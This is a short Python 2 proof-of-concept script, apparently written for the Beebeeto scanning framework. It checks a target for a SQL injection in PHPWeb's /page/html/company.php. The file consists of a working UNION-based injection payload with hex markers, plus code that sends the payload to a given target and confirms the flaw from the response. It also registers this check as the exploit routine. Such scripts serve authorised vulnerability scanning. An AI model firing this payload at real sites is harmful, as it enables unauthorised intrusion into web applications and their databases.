#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0223',
            'name': 'phpweb 1.3.18-1.4.3 /company.php SQL Injection POC',
            'author': '迦南',
            'create_date': '2014-12-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPWeb',
            'vul_version': ['1.4.3'],
            'type': 'SQL Injection',
            'tag': ['phpweb漏洞', 'SQL Injection', '/company.php', 'php'],
            'desc': 'N/A',
            'references': ['N/A',
          ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/page/html/company.php?id=1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x7176707a71,"
                  "0x4e5172484a7361735357,0x71787a6a71),NULL,NULL,NULL,NULL,NULL,NULL#")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '4e5172484a7361735357' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())